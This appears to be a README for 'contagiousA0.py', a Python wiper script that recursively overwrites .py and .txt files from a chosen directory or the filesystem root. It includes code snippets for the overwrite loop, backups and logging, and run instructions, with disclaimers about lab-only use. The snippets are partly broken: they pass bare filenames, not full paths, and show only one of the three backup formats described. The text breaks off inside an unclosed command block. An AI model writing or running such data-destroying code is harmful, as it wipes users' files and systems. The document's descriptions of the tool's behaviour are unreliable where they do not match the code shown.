# ContagiousA0.py - Wiper Virus Script

## Overview

`contagiousA0.py` is a **wiper virus script** that is designed to **irreversibly damage** or **destroy data** on a system by overwriting files with predefined, often meaningless content. This script has the potential to wipe critical data across an entire system, making files **irrecoverable** unless proper backups are available.

The script executes recursive file overwriting actions across directories, replacing various file types with pre-configured content. Backup copies of the affected files are created in multiple formats for potential restoration, but once the data is overwritten, **recovery is difficult** without backups.

This script is **extremely dangerous** and should never be used on production or personal systems without explicit permission and precautions. Misuse of this script can lead to **irreversible data loss**, **system corruption**, and **legal consequences**. The script is **intended solely for controlled, ethical testing purposes** in isolated environments such as virtual machines or testing labs.

### Features

- **Recursive File Overwriting**: 
  The script scans directories recursively and overwrites files, making them unrecoverable by replacing them with garbage or meaningless content. It operates across a system, potentially affecting system files, configuration files, user files, and application files.

- **Backup Mechanism**: 
  Before overwriting, the script creates backups of affected files in three formats:
  - Python backup (`.py`)
  - Plain text backup (`.txt`)
  - JSON backup (`.json`)
  
  This allows for potential restoration of files if necessary, though recovery is not guaranteed if the backup is also corrupted.

- **Systematic Logging**: 
  The script maintains logs of its operations, including:
  - Files affected (both overwritten and backed up)
  - Any errors encountered during the execution
  - Timestamps for when actions are taken
  
  The log files provide a detailed trail of the actions performed, which could be useful for audit purposes or post-execution analysis.

- **Timestamped Filenames**: 
  All logs and backup files are given unique filenames that include the **current date and time** to make it easy to track the execution of the script. The timestamped filenames ensure that each run’s actions are uniquely identifiable.

- **File Type Filtering**: 
  The script is configured to target specific types of files based on their extensions, such as:
  - Python files (`.py`)
  - Text files (`.txt`)
  - Other user-defined file types

  It can be configured to attack more or fewer file types, depending on user preferences.

- **Customizable Starting Directories**: 
  Users can specify the starting directory for the script's recursive operation. This can either be set to a specific path, or it can be left blank to let the script run from the root directory, affecting the entire file system.

## Dangers and Ethical Considerations

`contagiousA0.py` is highly **destructive** and **malicious**. The primary danger posed by this script includes:

1. **Irreversible Data Loss**: 
   - Once a file is overwritten by this script, the data is replaced with random content and cannot be recovered by traditional means. Even with backups, overwriting can lead to critical data loss if the backups are incomplete or damaged.

2. **System Instability**:
   - Overwriting critical system files (e.g., configuration files, executables) may result in **system crashes**, **application failures**, or even a **complete system failure**. The script could render a system unusable.

3. **Corruption of Files**: 
   - Files overwritten by this virus will be corrupted beyond repair. For instance, replacing executable files with random data will prevent them from running, and replacing text files with gibberish will render them unreadable.

4. **Spread of Destruction**: 
   - The recursive nature of this script means that it could spread its destructive action to every directory on a system. It can wipe files in user directories, system directories, and applications, potentially causing widespread damage across multiple platforms or devices.

5. **Legal Consequences**:
   - Using this script for unauthorized purposes is **illegal**. Running a wiper virus without explicit consent can lead to severe **legal consequences**, including criminal charges for hacking or data destruction. This type of action is considered a form of cyber attack and is illegal in most jurisdictions.

6. **Ethical Implications**: 
   - The intent behind creating or using a wiper virus must always be carefully considered. Using this script outside a **controlled, ethical testing environment** could result in harm to individuals, organizations, or companies. **Never deploy this script on a system you do not own or have explicit permission to test.**

### Intended Use

- **Controlled Educational Environments**: The script can be used in isolated environments to teach about the dangers of malicious software and to explore methods for recovery after data destruction.
  
- **Security Research**: The script may be used for testing the resilience of backup systems or other recovery mechanisms in response to a wiper virus.

- **Ethical Hacking and Penetration Testing**: In highly controlled environments, the script can demonstrate the potential damage of file overwriting in a network or system. Again, this should only be done with full permission and in a safe, isolated environment.

## Code Breakdown

The `contagiousA0.py` script consists of several functions designed to perform its destructive operations in a controlled and structured manner. Below is a breakdown of the major components:

### 1. **ParseTime**:
   - **Purpose**: This function retrieves the current system time and formats it as a string. This timestamp is used for naming backup and log files to keep them unique and traceable.
   
   - **Example Usage**:
     ```python
     def parse_time():
         return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     ```

### 2. **WriteLog**:
   - **Purpose**: Logs each action the script takes, including file overwrites, backups, and any errors encountered.
   
   - **Example**:
     ```python
     def write_log(message):
         with open('log.txt', 'a') as log:
             log.write(f"{parse_time()} - {message}\n")
     ```

### 3. **WriteCode**:
   - **Purpose**: This function writes predefined data (often nonsensical or meaningless) into a target file, effectively destroying its original content.
   
   - **Example**:
     ```python
     def write_code(file_path):
         with open(file_path, 'w') as file:
             file.write("### File Overwritten by ContagiousA0 ###\n")
     ```

### 4. **CreateBackup**:
   - **Purpose**: Before overwriting a file, the script backs it up in various formats, including JSON, Python, and plain text. This provides a slim chance for recovery if the backup files are intact.
   
   - **Example**:
     ```python
     def create_backup(file_path):
         with open(file_path, 'r') as file:
             data = file.read()
         with open(f"{file_path}_{parse_time()}.json", 'w') as backup:
             json.dump(data, backup)
     ```

### 5. **CheckFile**:
   - **Purpose**: Verifies if the file exists before attempting to overwrite it. If the file doesn’t exist, the script will skip it.
   
   - **Example**:
     ```python
     def check_file(file_path):
         return os.path.exists(file_path)
     ```

### 6. **Alas (Main Destructive Function)**:
   - **Purpose**: The core function that initiates the file overwriting process. It recursively traverses directories and targets specific file types. The function will attempt to overwrite all files found with predefined content.
   
   - **Example**:
     ```python
     def alas(directory):
         for root, dirs, files in os.walk(directory):
             for file in files:
                 if file.endswith('.py') or file.endswith('.txt'):
                     create_backup(file)
                     write_code(file)
     ```

## Usage Instructions

### Running the Script

1. **Ensure you are in a controlled environment**:
   - Use a **virtual machine** or an isolated test system that can be quickly restored if necessary. **Never run this script on production systems or devices with valuable data.**

2. **Run the script**:
   - Open your terminal or command prompt and execute the script using Python 3.x:
     ```bash
     python3 contagiousA0.py
     ```

3. **User Input**:
   - The script may prompt you to specify directories, file types to target, or confirm actions such as creating backups or logging operations.

4. **Monitor Execution**:
   - The script will generate logs and backups as it operates. Monitor the log file to ensure the script is executing as intended.

### Example Command-Line Interaction

```bash
python3 contagiousA0.py
